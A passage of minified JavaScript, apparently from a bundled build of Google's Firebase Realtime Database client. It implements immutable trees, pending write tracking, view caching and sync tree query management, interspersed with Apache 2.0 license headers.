 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let gc;const uC=()=>(gc||(gc=new wt(Qw)),gc);class ge{constructor(e,n=uC()){this.value=e,this.children=n}static fromObject(e){let n=new ge(null);return nt(e,(r,s)=>{n=n.set(new he(r),s)}),n}isEmpty(){return this.value===null&&this.children.isEmpty()}findRootMostMatchingPathAndValue(e,n){if(this.value!=null&&n(this.value))return{path:ue(),value:this.value};if(ie(e))return null;{const r=re(e),s=this.children.get(r);if(s!==null){const o=s.findRootMostMatchingPathAndValue(ve(e),n);return o!=null?{path:Te(new he(r),o.path),value:o.value}:null}else return null}}findRootMostValueAndPath(e){return this.findRootMostMatchingPathAndValue(e,()=>!0)}subtree(e){if(ie(e))return this;{const n=re(e),r=this.children.get(n);return r!==null?r.subtree(ve(e)):new ge(null)}}set(e,n){if(ie(e))return new ge(n,this.children);{const r=re(e),o=(this.children.get(r)||new ge(null)).set(ve(e),n),a=this.children.insert(r,o);return new ge(this.value,a)}}remove(e){if(ie(e))return this.children.isEmpty()?new ge(null):new ge(null,this.children);{const n=re(e),r=this.children.get(n);if(r){const s=r.remove(ve(e));let o;return s.isEmpty()?o=this.children.remove(n):o=this.children.insert(n,s),this.value===null&&o.isEmpty()?new ge(null):new ge(this.value,o)}else return this}}get(e){if(ie(e))return this.value;{const n=re(e),r=this.children.get(n);return r?r.get(ve(e)):null}}setTree(e,n){if(ie(e))return n;{const r=re(e),o=(this.children.get(r)||new ge(null)).setTree(ve(e),n);let a;return o.isEmpty()?a=this.children.remove(r):a=this.children.insert(r,o),new ge(this.value,a)}}fold(e){return this.fold_(ue(),e)}fold_(e,n){const r={};return this.children.inorderTraversal((s,o)=>{r[s]=o.fold_(Te(e,s),n)}),n(e,this.value,r)}findOnPath(e,n){return this.findOnPath_(e,ue(),n)}findOnPath_(e,n,r){const s=this.value?r(n,this.value):!1;if(s)return s;if(ie(e))return null;{const o=re(e),a=this.children.get(o);return a?a.findOnPath_(ve(e),Te(n,o),r):null}}foreachOnPath(e,n){return this.foreachOnPath_(e,ue(),n)}foreachOnPath_(e,n,r){if(ie(e))return this;{this.value&&r(n,this.value);const s=re(e),o=this.children.get(s);return o?o.foreachOnPath_(ve(e),Te(n,s),r):new ge(null)}}foreach(e){this.foreach_(ue(),e)}foreach_(e,n){this.children.inorderTraversal((r,s)=>{s.foreach_(Te(e,r),n)}),this.value&&n(e,this.value)}foreachChild(e){this.children.inorderTraversal((n,r)=>{r.value&&e(n,r.value)})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sn{constructor(e){this.writeTree_=e}static empty(){return new sn(new ge(null))}}function Ei(t,e,n){if(ie(e))return new sn(new ge(n));{const r=t.writeTree_.findRootMostValueAndPath(e);if(r!=null){const s=r.path;let o=r.value;const a=ut(s,e);return o=o.updateChild(a,n),new sn(t.writeTree_.set(s,o))}else{const s=new ge(n),o=t.writeTree_.setTree(e,s);return new sn(o)}}}function kd(t,e,n){let r=t;return nt(n,(s,o)=>{r=Ei(r,Te(e,s),o)}),r}function gh(t,e){if(ie(e))return sn.empty();{const n=t.writeTree_.setTree(e,new ge(null));return new sn(n)}}function Nd(t,e){return Ur(t,e)!=null}function Ur(t,e){const n=t.writeTree_.findRootMostValueAndPath(e);return n!=null?t.writeTree_.get(n.path).getChild(ut(n.path,e)):null}function xh(t){const e=[],n=t.writeTree_.value;return n!=null?n.isLeafNode()||n.forEachChild(Ae,(r,s)=>{e.push(new se(r,s))}):t.writeTree_.children.inorderTraversal((r,s)=>{s.value!=null&&e.push(new se(r,s.value))}),e}function ir(t,e){if(ie(e))return t;{const n=Ur(t,e);return n!=null?new sn(new ge(n)):new sn(t.writeTree_.subtree(e))}}function Ed(t){return t.writeTree_.isEmpty()}function As(t,e){return lv(ue(),t.writeTree_,e)}function lv(t,e,n){if(e.value!=null)return n.updateChild(t,e.value);{let r=null;return e.children.inorderTraversal((s,o)=>{s===".priority"?($(o.value!==null,"Priority writes must always be leaf nodes"),r=o.value):n=lv(Te(t,s),o,n)}),!n.getChild(t).isEmpty()&&r!==null&&(n=n.updateChild(Te(t,".priority"),r)),n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function _l(t,e){return pv(e,t)}function pC(t,e,n,r,s){$(r>t.lastWriteId,"Stacking an older write on top of newer ones"),s===void 0&&(s=!0),t.allWrites.push({path:e,snap:n,writeId:r,visible:s}),s&&(t.visibleWrites=Ei(t.visibleWrites,e,n)),t.lastWriteId=r}function fC(t,e,n,r){$(r>t.lastWriteId,"Stacking an older merge on top of newer ones"),t.allWrites.push({path:e,children:n,writeId:r,visible:!0}),t.visibleWrites=kd(t.visibleWrites,e,n),t.lastWriteId=r}function hC(t,e){for(let n=0;n<t.allWrites.length;n++){const r=t.allWrites[n];if(r.writeId===e)return r}return null}function mC(t,e){const n=t.allWrites.findIndex(l=>l.writeId===e);$(n>=0,"removeWrite called with nonexistent writeId.");const r=t.allWrites[n];t.allWrites.splice(n,1);let s=r.visible,o=!1,a=t.allWrites.length-1;for(;s&&a>=0;){const l=t.allWrites[a];l.visible&&(a>=n&&gC(l,r.path)?s=!1:Bt(r.path,l.path)&&(o=!0)),a--}if(s){if(o)return xC(t),!0;if(r.snap)t.visibleWrites=gh(t.visibleWrites,r.path);else{const l=r.children;nt(l,c=>{t.visibleWrites=gh(t.visibleWrites,Te(r.path,c))})}return!0}else return!1}function gC(t,e){if(t.snap)return Bt(t.path,e);for(const n in t.children)if(t.children.hasOwnProperty(n)&&Bt(Te(t.path,n),e))return!0;return!1}function xC(t){t.visibleWrites=cv(t.allWrites,vC,ue()),t.allWrites.length>0?t.lastWriteId=t.allWrites[t.allWrites.length-1].writeId:t.lastWriteId=-1}function vC(t){return t.visible}function cv(t,e,n){let r=sn.empty();for(let s=0;s<t.length;++s){const o=t[s];if(e(o)){const a=o.path;let l;if(o.snap)Bt(n,a)?(l=ut(n,a),r=Ei(r,l,o.snap)):Bt(a,n)&&(l=ut(a,n),r=Ei(r,ue(),o.snap.getChild(l)));else if(o.children){if(Bt(n,a))l=ut(n,a),r=kd(r,l,o.children);else if(Bt(a,n))if(l=ut(a,n),ie(l))r=kd(r,ue(),o.children);else{const c=Es(o.children,re(l));if(c){const d=c.getChild(ve(l));r=Ei(r,ue(),d)}}}else throw Ws("WriteRecord should have .snap or .children")}}return r}function dv(t,e,n,r,s){if(!r&&!s){const o=Ur(t.visibleWrites,e);if(o!=null)return o;{const a=ir(t.visibleWrites,e);if(Ed(a))return n;if(n==null&&!Nd(a,ue()))return null;{const l=n||J.EMPTY_NODE;return As(a,l)}}}else{const o=ir(t.visibleWrites,e);if(!s&&Ed(o))return n;if(!s&&n==null&&!Nd(o,ue()))return null;{const a=function(d){return(d.visible||s)&&(!r||!~r.indexOf(d.writeId))&&(Bt(d.path,e)||Bt(e,d.path))},l=cv(t.allWrites,a,e),c=n||J.EMPTY_NODE;return As(l,c)}}}function yC(t,e,n){let r=J.EMPTY_NODE;const s=Ur(t.visibleWrites,e);if(s)return s.isLeafNode()||s.forEachChild(Ae,(o,a)=>{r=r.updateImmediateChild(o,a)}),r;if(n){const o=ir(t.visibleWrites,e);return n.forEachChild(Ae,(a,l)=>{const c=As(ir(o,new he(a)),l);r=r.updateImmediateChild(a,c)}),xh(o).forEach(a=>{r=r.updateImmediateChild(a.name,a.node)}),r}else{const o=ir(t.visibleWrites,e);return xh(o).forEach(a=>{r=r.updateImmediateChild(a.name,a.node)}),r}}function bC(t,e,n,r,s){$(r||s,"Either existingEventSnap or existingServerSnap must exist");const o=Te(e,n);if(Nd(t.visibleWrites,o))return null;{const a=ir(t.visibleWrites,o);return Ed(a)?s.getChild(n):As(a,s.getChild(n))}}function _C(t,e,n,r){const s=Te(e,n),o=Ur(t.visibleWrites,s);if(o!=null)return o;if(r.isCompleteForChild(n)){const a=ir(t.visibleWrites,s);return As(a,r.getNode().getImmediateChild(n))}else return null}function wC(t,e){return Ur(t.visibleWrites,e)}function SC(t,e,n,r,s,o,a){let l;const c=ir(t.visibleWrites,e),d=Ur(c,ue());if(d!=null)l=d;else if(n!=null)l=As(c,n);else return[];if(l=l.withIndex(a),!l.isEmpty()&&!l.isLeafNode()){const p=[],f=a.getCompare(),u=o?l.getReverseIteratorFrom(r,a):l.getIteratorFrom(r,a);let b=u.getNext();for(;b&&p.length<s;)f(b,r)!==0&&p.push(b),b=u.getNext();return p}else return[]}function CC(){return{visibleWrites:sn.empty(),allWrites:[],lastWriteId:-1}}function Va(t,e,n,r){return dv(t.writeTree,t.treePath,e,n,r)}function ep(t,e){return yC(t.writeTree,t.treePath,e)}function vh(t,e,n,r){return bC(t.writeTree,t.treePath,e,n,r)}function Ga(t,e){return wC(t.writeTree,Te(t.treePath,e))}function jC(t,e,n,r,s,o){return SC(t.writeTree,t.treePath,e,n,r,s,o)}function tp(t,e,n){return _C(t.writeTree,t.treePath,e,n)}function uv(t,e){return pv(Te(t.treePath,e),t.writeTree)}function pv(t,e){return{treePath:t,writeTree:e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class kC{constructor(){this.changeMap=new Map}trackChildChange(e){const n=e.type,r=e.childName;$(n==="child_added"||n==="child_changed"||n==="child_removed","Only child changes supported for tracking"),$(r!==".priority","Only non-priority child changes can be tracked.");const s=this.changeMap.get(r);if(s){const o=s.type;if(n==="child_added"&&o==="child_removed")this.changeMap.set(r,eo(r,e.snapshotNode,s.snapshotNode));else if(n==="child_removed"&&o==="child_added")this.changeMap.delete(r);else if(n==="child_removed"&&o==="child_changed")this.changeMap.set(r,Zi(r,s.oldSnap));else if(n==="child_changed"&&o==="child_added")this.changeMap.set(r,Rs(r,e.snapshotNode));else if(n==="child_changed"&&o==="child_changed")this.changeMap.set(r,eo(r,e.snapshotNode,s.oldSnap));else throw Ws("Illegal combination of changes: "+e+" occurred after "+s)}else this.changeMap.set(r,e)}getChanges(){return Array.from(this.changeMap.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class NC{getCompleteChild(e){return null}getChildAfterChild(e,n,r){return null}}const fv=new NC;class np{constructor(e,n,r=null){this.writes_=e,this.viewCache_=n,this.optCompleteServerCache_=r}getCompleteChild(e){const n=this.viewCache_.eventCache;if(n.isCompleteForChild(e))return n.getNode().getImmediateChild(e);{const r=this.optCompleteServerCache_!=null?new dr(this.optCompleteServerCache_,!0,!1):this.viewCache_.serverCache;return tp(this.writes_,e,r)}}getChildAfterChild(e,n,r){const s=this.optCompleteServerCache_!=null?this.optCompleteServerCache_:Or(this.viewCache_),o=jC(this.writes_,s,n,1,r,e);return o.length===0?null:o[0]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function EC(t){return{filter:t}}function IC(t,e){$(e.eventCache.getNode().isIndexed(t.filter.getIndex()),"Event snap not indexed"),$(e.serverCache.getNode().isIndexed(t.filter.getIndex()),"Server snap not indexed")}function RC(t,e,n,r,s){const o=new kC;let a,l;if(n.type===en.OVERWRITE){const d=n;d.source.fromUser?a=Id(t,e,d.path,d.snap,r,s,o):($(d.source.fromServer,"Unknown source."),l=d.source.tagged||e.serverCache.isFiltered()&&!ie(d.path),a=Ya(t,e,d.path,d.snap,r,s,l,o))}else if(n.type===en.MERGE){const d=n;d.source.fromUser?a=AC(t,e,d.path,d.children,r,s,o):($(d.source.fromServer,"Unknown source."),l=d.source.tagged||e.serverCache.isFiltered(),a=Rd(t,e,d.path,d.children,r,s,l,o))}else if(n.type===en.ACK_USER_WRITE){const d=n;d.revert?a=LC(t,e,d.path,r,s,o):a=PC(t,e,d.path,d.affectedTree,r,s,o)}else if(n.type===en.LISTEN_COMPLETE)a=DC(t,e,n.path,r,o);else throw Ws("Unknown operation type: "+n.type);const c=o.getChanges();return TC(e,a,c),{viewCache:a,changes:c}}function TC(t,e,n){const r=e.eventCache;if(r.isFullyInitialized()){const s=r.getNode().isLeafNode()||r.getNode().isEmpty(),o=Ha(t);(n.length>0||!t.eventCache.isFullyInitialized()||s&&!r.getNode().equals(o)||!r.getNode().getPriority().equals(o.getPriority()))&&n.push(iv(Ha(e)))}}function hv(t,e,n,r,s,o){const a=e.eventCache;if(Ga(r,n)!=null)return e;{let l,c;if(ie(n))if($(e.serverCache.isFullyInitialized(),"If change path is empty, we must have complete server data"),e.serverCache.isFiltered()){const d=Or(e),p=d instanceof J?d:J.EMPTY_NODE,f=ep(r,p);l=t.filter.updateFullNode(e.eventCache.getNode(),f,o)}else{const d=Va(r,Or(e));l=t.filter.updateFullNode(e.eventCache.getNode(),d,o)}else{const d=re(n);if(d===".priority"){$(cr(n)===1,"Can't have a priority with additional path components");const p=a.getNode();c=e.serverCache.getNode();const f=vh(r,n,p,c);f!=null?l=t.filter.updatePriority(p,f):l=a.getNode()}else{const p=ve(n);let f;if(a.isCompleteForChild(d)){c=e.serverCache.getNode();const u=vh(r,n,a.getNode(),c);u!=null?f=a.getNode().getImmediateChild(d).updateChild(p,u):f=a.getNode().getImmediateChild(d)}else f=tp(r,d,e.serverCache);f!=null?l=t.filter.updateChild(a.getNode(),d,f,p,s,o):l=a.getNode()}}return Ni(e,l,a.isFullyInitialized()||ie(n),t.filter.filtersNodes())}}function Ya(t,e,n,r,s,o,a,l){const c=e.serverCache;let d;const p=a?t.filter:t.filter.getIndexedFilter();if(ie(n))d=p.updateFullNode(c.getNode(),r,null);else if(p.filtersNodes()&&!c.isFiltered()){const b=c.getNode().updateChild(n,r);d=p.updateFullNode(c.getNode(),b,null)}else{const b=re(n);if(!c.isCompleteForPath(n)&&cr(n)>1)return e;const x=ve(n),_=c.getNode().getImmediateChild(b).updateChild(x,r);b===".priority"?d=p.updatePriority(c.getNode(),_):d=p.updateChild(c.getNode(),b,_,x,fv,null)}const f=av(e,d,c.isFullyInitialized()||ie(n),p.filtersNodes()),u=new np(s,f,o);return hv(t,f,n,s,u,l)}function Id(t,e,n,r,s,o,a){const l=e.eventCache;let c,d;const p=new np(s,e,o);if(ie(n))d=t.filter.updateFullNode(e.eventCache.getNode(),r,a),c=Ni(e,d,!0,t.filter.filtersNodes());else{const f=re(n);if(f===".priority")d=t.filter.updatePriority(e.eventCache.getNode(),r),c=Ni(e,d,l.isFullyInitialized(),l.isFiltered());else{const u=ve(n),b=l.getNode().getImmediateChild(f);let x;if(ie(u))x=r;else{const v=p.getCompleteChild(f);v!=null?Vu(u)===".priority"&&v.getChild(Jx(u)).isEmpty()?x=v:x=v.updateChild(u,r):x=J.EMPTY_NODE}if(b.equals(x))c=e;else{const v=t.filter.updateChild(l.getNode(),f,x,u,p,a);c=Ni(e,v,l.isFullyInitialized(),t.filter.filtersNodes())}}}return c}function yh(t,e){return t.eventCache.isCompleteForChild(e)}function AC(t,e,n,r,s,o,a){let l=e;return r.foreach((c,d)=>{const p=Te(n,c);yh(e,re(p))&&(l=Id(t,l,p,d,s,o,a))}),r.foreach((c,d)=>{const p=Te(n,c);yh(e,re(p))||(l=Id(t,l,p,d,s,o,a))}),l}function bh(t,e,n){return n.foreach((r,s)=>{e=e.updateChild(r,s)}),e}function Rd(t,e,n,r,s,o,a,l){if(e.serverCache.getNode().isEmpty()&&!e.serverCache.isFullyInitialized())return e;let c=e,d;ie(n)?d=r:d=new ge(null).setTree(n,r);const p=e.serverCache.getNode();return d.children.inorderTraversal((f,u)=>{if(p.hasChild(f)){const b=e.serverCache.getNode().getImmediateChild(f),x=bh(t,b,u);c=Ya(t,c,new he(f),x,s,o,a,l)}}),d.children.inorderTraversal((f,u)=>{const b=!e.serverCache.isCompleteForChild(f)&&u.value===null;if(!p.hasChild(f)&&!b){const x=e.serverCache.getNode().getImmediateChild(f),v=bh(t,x,u);c=Ya(t,c,new he(f),v,s,o,a,l)}}),c}function PC(t,e,n,r,s,o,a){if(Ga(s,n)!=null)return e;const l=e.serverCache.isFiltered(),c=e.serverCache;if(r.value!=null){if(ie(n)&&c.isFullyInitialized()||c.isCompleteForPath(n))return Ya(t,e,n,c.getNode().getChild(n),s,o,l,a);if(ie(n)){let d=new ge(null);return c.getNode().forEachChild(bs,(p,f)=>{d=d.set(new he(p),f)}),Rd(t,e,n,d,s,o,l,a)}else return e}else{let d=new ge(null);return r.foreach((p,f)=>{const u=Te(n,p);c.isCompleteForPath(u)&&(d=d.set(p,c.getNode().getChild(u)))}),Rd(t,e,n,d,s,o,l,a)}}function DC(t,e,n,r,s){const o=e.serverCache,a=av(e,o.getNode(),o.isFullyInitialized()||ie(n),o.isFiltered());return hv(t,a,n,r,fv,s)}function LC(t,e,n,r,s,o){let a;if(Ga(r,n)!=null)return e;{const l=new np(r,e,s),c=e.eventCache.getNode();let d;if(ie(n)||re(n)===".priority"){let p;if(e.serverCache.isFullyInitialized())p=Va(r,Or(e));else{const f=e.serverCache.getNode();$(f instanceof J,"serverChildren would be complete if leaf node"),p=ep(r,f)}p=p,d=t.filter.updateFullNode(c,p,o)}else{const p=re(n);let f=tp(r,p,e.serverCache);f==null&&e.serverCache.isCompleteForChild(p)&&(f=c.getImmediateChild(p)),f!=null?d=t.filter.updateChild(c,p,f,ve(n),l,o):e.eventCache.getNode().hasChild(p)?d=t.filter.updateChild(c,p,J.EMPTY_NODE,ve(n),l,o):d=c,d.isEmpty()&&e.serverCache.isFullyInitialized()&&(a=Va(r,Or(e)),a.isLeafNode()&&(d=t.filter.updateFullNode(d,a,o)))}return a=e.serverCache.isFullyInitialized()||Ga(r,ue())!=null,Ni(e,d,a,t.filter.filtersNodes())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zC{constructor(e,n){this.query_=e,this.eventRegistrations_=[];const r=this.query_._queryParams,s=new Qu(r.getIndex()),o=eC(r);this.processor_=EC(o);const a=n.serverCache,l=n.eventCache,c=s.updateFullNode(J.EMPTY_NODE,a.getNode(),null),d=o.updateFullNode(J.EMPTY_NODE,l.getNode(),null),p=new dr(c,a.isFullyInitialized(),s.filtersNodes()),f=new dr(d,l.isFullyInitialized(),o.filtersNodes());this.viewCache_=bl(f,p),this.eventGenerator_=new aC(this.query_)}get query(){return this.query_}}function MC(t){return t.viewCache_.serverCache.getNode()}function OC(t){return Ha(t.viewCache_)}function FC(t,e){const n=Or(t.viewCache_);return n&&(t.query._queryParams.loadsAllData()||!ie(e)&&!n.getImmediateChild(re(e)).isEmpty())?n.getChild(e):null}function _h(t){return t.eventRegistrations_.length===0}function WC(t,e){t.eventRegistrations_.push(e)}function wh(t,e,n){const r=[];if(n){$(e==null,"A cancel should cancel all event registrations.");const s=t.query._path;t.eventRegistrations_.forEach(o=>{const a=o.createCancelEvent(n,s);a&&r.push(a)})}if(e){let s=[];for(let o=0;o<t.eventRegistrations_.length;++o){const a=t.eventRegistrations_[o];if(!a.matches(e))s.push(a);else if(e.hasAnyCallback()){s=s.concat(t.eventRegistrations_.slice(o+1));break}}t.eventRegistrations_=s}else t.eventRegistrations_=[];return r}function Sh(t,e,n,r){e.type===en.MERGE&&e.source.queryId!==null&&($(Or(t.viewCache_),"We should always have a full cache before handling merges"),$(Ha(t.viewCache_),"Missing event cache, even though we have a server cache"));const s=t.viewCache_,o=RC(t.processor_,s,e,n,r);return IC(t.processor_,o.viewCache),$(o.viewCache.serverCache.isFullyInitialized()||!s.serverCache.isFullyInitialized(),"Once a server snap is complete, it should never go back"),t.viewCache_=o.viewCache,mv(t,o.changes,o.viewCache.eventCache.getNode(),null)}function $C(t,e){const n=t.viewCache_.eventCache,r=[];return n.getNode().isLeafNode()||n.getNode().forEachChild(Ae,(o,a)=>{r.push(Rs(o,a))}),n.isFullyInitialized()&&r.push(iv(n.getNode())),mv(t,r,n.getNode(),e)}function mv(t,e,n,r){const s=r?[r]:t.eventRegistrations_;return lC(t.eventGenerator_,e,n,s)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Ka;class gv{constructor(){this.views=new Map}}function BC(t){$(!Ka,"__referenceConstructor has already been defined"),Ka=t}function UC(){return $(Ka,"Reference.ts has not been loaded"),Ka}function HC(t){return t.views.size===0}function rp(t,e,n,r){const s=e.source.queryId;if(s!==null){const o=t.views.get(s);return $(o!=null,"SyncTree gave us an op for an invalid query."),Sh(o,e,n,r)}else{let o=[];for(const a of t.views.values())o=o.concat(Sh(a,e,n,r));return o}}function xv(t,e,n,r,s){const o=e._queryIdentifier,a=t.views.get(o);if(!a){let l=Va(n,s?r:null),c=!1;l?c=!0:r instanceof J?(l=ep(n,r),c=!1):(l=J.EMPTY_NODE,c=!1);const d=bl(new dr(l,c,!1),new dr(r,s,!1));return new zC(e,d)}return a}function VC(t,e,n,r,s,o){const a=xv(t,e,r,s,o);return t.views.has(e._queryIdentifier)||t.views.set(e._queryIdentifier,a),WC(a,n),$C(a,n)}function GC(t,e,n,r){const s=e._queryIdentifier,o=[];let a=[];const l=ur(t);if(s==="default")for(const[c,d]of t.views.entries())a=a.concat(wh(d,n,r)),_h(d)&&(t.views.delete(c),d.query._queryParams.loadsAllData()||o.push(d.query));else{const c=t.views.get(s);c&&(a=a.concat(wh(c,n,r)),_h(c)&&(t.views.delete(s),c.query._queryParams.loadsAllData()||o.push(c.query)))}return l&&!ur(t)&&o.push(new(UC())(e._repo,e._path)),{removed:o,events:a}}function vv(t){const e=[];for(const n of t.views.values())n.query._queryParams.loadsAllData()||e.push(n);return e}function or(t,e){let n=null;for(const r of t.views.values())n=n||FC(r,e);return n}function yv(t,e){if(e._queryParams.loadsAllData())return wl(t);{const r=e._queryIdentifier;return t.views.get(r)}}function bv(t,e){return yv(t,e)!=null}function ur(t){return wl(t)!=null}function wl(t){for(const e of t.views.values())if(e.query._queryParams.loadsAllData())return e;return null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Qa;function YC(t){$(!Qa,"__referenceConstructor has already been defined"),Qa=t}function KC(){return $(Qa,"Reference.ts has not been loaded"),Qa}let QC=1;class Ch{constructor(e){this.listenProvider_=e,this.syncPointTree_=new ge(null),this.pendingWriteTree_=CC(),this.tagToQueryMap=new Map,this.queryToTagMap=new Map}}function _v(t,e,n,r,s){return pC(t.pendingWriteTree_,e,n,r,s),s?Bs(t,new Mr(Xu(),e,n)):[]}function qC(t,e,n,r){fC(t.pendingWriteTree_,e,n,r);const s=ge.fromObject(n);return Bs(t,new Ts(Xu(),e,s))}function Kn(t,e,n=!1){const r=hC(t.pendingWriteTree_,e);if(mC(t.pendingWriteTree_,e)){let o=new ge(null);return r.snap!=null?o=o.set(ue(),!0):nt(r.children,a=>{o=o.set(new he(a),!0)}),Bs(t,new Ua(r.path,o,n))}else return[]}function yo(t,e,n){return Bs(t,new Mr(Ju(),e,n))}function XC(t,e,n){const r=ge.fromObject(n);return Bs(t,new Ts(Ju(),e,r))}function JC(t,e){return Bs(t,new no(Ju(),e))}function ZC(t,e,n){const r=ip(t,n);if(r){const s=op(r),o=s.path,a=s.queryId,l=ut(o,e),c=new no(Zu(a),l);return ap(t,o,c)}else return[]}function qa(t,e,n,r,s=!1){const o=e._path,a=t.syncPointTree_.get(o);let l=[];if(a&&(e._queryIdentifier==="default"||bv(a,e))){const c=GC(a,e,n,r);HC(a)&&(t.syncPointTree_=t.syncPointTree_.remove(o));const d=c.removed;if(l=c.events,!s){const p=d.findIndex(u=>u._queryParams.loadsAllData())!==-1,f=t.syncPointTree_.findOnPath(o,(u,b)=>ur(b));if(p&&!f){const u=t.syncPointTree_.subtree(o);if(!u.isEmpty()){const b=nj(u);for(let x=0;x<b.length;++x){const v=b[x],_=v.query,m=jv(t,v);t.listenProvider_.startListening(Ii(_),ro(t,_),m.hashFn,m.onComplete)}}}!f&&d.length>0&&!r&&(p?t.listenProvider_.stopListening(Ii(e),null):d.forEach(u=>{const b=t.queryToTagMap.get(Sl(u));t.listenProvider_.stopListening(Ii(u),b)}))}rj(t,d)}return l}function wv(t,e,n,r){const s=ip(t,r);if(s!=null){const o=op(s),a=o.path,l=o.queryId,c=ut(a,e),d=new Mr(Zu(l),c,n);return ap(t,a,d)}else return[]}function ej(t,e,n,r){const s=ip(t,r);if(s){const o=op(s),a=o.path,l=o.queryId,c=ut(a,e),d=ge.fromObject(n),p=new Ts(Zu(l),c,d);return ap(t,a,p)}else return[]}function Td(t,e,n,r=!1){const s=e._path;let o=null,a=!1;t.syncPointTree_.foreachOnPath(s,(u,b)=>{const x=ut(u,s);o=o||or(b,x),a=a||ur(b)});let l=t.syncPointTree_.get(s);l?(a=a||ur(l),o=o||or(l,ue())):(l=new gv,t.syncPointTree_=t.syncPointTree_.set(s,l));let c;o!=null?c=!0:(c=!1,o=J.EMPTY_NODE,t.syncPointTree_.subtree(s).foreachChild((b,x)=>{const v=or(x,ue());v&&(o=o.updateImmediateChild(b,v))}));const d=bv(l,e);if(!d&&!e._queryParams.loadsAllData()){const u=Sl(e);$(!t.queryToTagMap.has(u),"View does not exist, but we have a tag");const b=sj();t.queryToTagMap.set(u,b),t.tagToQueryMap.set(b,u)}const p=_l(t.pendingWriteTree_,s);let f=VC(l,e,n,p,o,c);if(!d&&!a&&!r){const u=yv(l,e);f=f.concat(ij(t,e,u))}return f}function sp(t,e,n){const s=t.pendingWriteTree_,o=t.syncPointTree_.findOnPath(e,(a,l)=>{const c=ut(a,e),d=or(l,c);if(d)return d});return dv(s,e,o,n,!0)}function tj(t,e){const n=e._path;let r=null;t.syncPointTree_.foreachOnPath(n,(d,p)=>{const f=ut(d,n);r=r||or(p,f)});let s=t.syncPointTree_.get(n);s?r=r||or(s,ue()):(s=new gv,t.syncPointTree_=t.syncPointTree_.set(n,s));const o=r!=null,a=o?new dr(r,!0,!1):null,l=_l(t.pendingWriteTree_,e._path),c=xv(s,e,l,o?a.getNode():J.EMPTY_NODE,o);return OC(c)}function Bs(t,e){return Sv(e,t.syncPointTree_,null,_l(t.pendingWriteTree_,ue()))}function Sv(t,e,n,r){if(ie(t.path))return Cv(t,e,n,r);{const s=e.get(ue());n==null&&s!=null&&(n=or(s,ue()));let o=[];const a=re(t.path),l=t.operationForChild(a),c=e.children.get(a);if(c&&l){const d=n?n.getImmediateChild(a):null,p=uv(r,a);o=o.concat(Sv(l,c,d,p))}return s&&(o=o.concat(rp(s,t,r,n))),o}}function Cv(t,e,n,r){const s=e.get(ue());n==null&&s!=null&&(n=or(s,ue()));let o=[];return e.children.inorderTraversal((a,l)=>{const 